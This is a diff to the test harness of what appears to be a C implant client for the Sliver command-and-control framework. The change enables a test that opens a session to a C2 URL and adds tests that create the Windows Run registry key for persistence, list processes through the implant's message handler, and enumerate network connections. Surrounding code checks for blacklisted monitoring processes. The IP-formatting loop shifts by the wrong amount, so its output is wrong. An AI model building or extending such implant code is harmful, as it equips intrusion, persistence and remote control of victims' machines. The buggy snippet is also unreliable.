@@ -1127,7 +1127,7 @@ void test62() {
 
 	pSliverClient = SliverSessionInit("http://ubuntu-icefrog2000.com");
 	if (pSliverClient == NULL) {
-		wprintf(L"SliverHttpClientInit failed");
+		LogError(L"SliverHttpClientInit failed");
 		goto CLEANUP;
 	}
 
@@ -1358,6 +1358,56 @@ void test77() {
 	FREE(lpCommandLine);
 }
 
+void test78() {
+	SHCreateDirectory(NULL, L"C:\\Users\\Admin\\Desktop\\Test1\\Test2");
+}
+
+void test79() {
+	PNETWORK_CONNECTION pConnections = NULL;
+	PNETWORK_CONNECTION pConnectionEnrty = NULL;
+	DWORD dwNumberOfConnections = 0;
+	DWORD i = 0;
+	DWORD j = 0;
+	CHAR szIPv4[17];
+	ULONG uIpv4 = 0;
+
+	pConnections = GetNetworkConnections(&dwNumberOfConnections);
+	for (i = 0; i < dwNumberOfConnections; i++) {
+		pConnectionEnrty = &pConnections[i];
+		printf("uProtocolType: %d\n", pConnectionEnrty->uProtocolType);
+		printf("Ipv4: ");
+		uIpv4 = pConnectionEnrty->LocalEndpoint.Address.Ipv4;
+		SecureZeroMemory(szIPv4, sizeof(szIPv4));
+		for (j = 0; j < sizeof(ULONG); j++) {
+			sprintf(&szIPv4[lstrlenA(szIPv4)], "%d.", ((uIpv4 >> (j * 4)) & 0xFF));
+		}
+
+		szIPv4[lstrlenA(szIPv4) - 1] = '\0';
+		printf("%s", szIPv4);
+	}
+}
+
+void test80() {
+	PENVELOPE pEnvelope = NULL;
+	PENVELOPE pRespEnvelope = NULL;
+
+	pEnvelope = ALLOC(sizeof(ENVELOPE));
+	pRespEnvelope = PsHandler(pEnvelope);
+	HexDump(pRespEnvelope->pData->pBuffer, pRespEnvelope->pData->cbBuffer);
+	FreeEnvelope(pRespEnvelope);
+}
+
+void test81() {
+	HKEY hKey = NULL;
+	LSTATUS Status = ERROR_SUCCESS;
+
+	Status = RegCreateKeyA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
+	printf("0x%08x\n", Status);
+	if (hKey != NULL) {
+		RegCloseKey(hKey);
+	}
+}
+
 VOID DetectMonitorSystem() {
 	while (TRUE) {
 		if (CheckForBlackListProcess()) {
@@ -1459,7 +1509,7 @@ int main() {
 	//test59();
 	//test60();
 	//test61();
-	//test62();
+	test62();
 	//test64();
 	//test65();
 	//test66();
@@ -1473,6 +1523,10 @@ int main() {
 	//test74();
 	//test75();
 	//test76();
-	test77();
+	//test77();
+	//test78();
+	//test79();
+	//test80();
+	//test81();
 	return 0;
 }
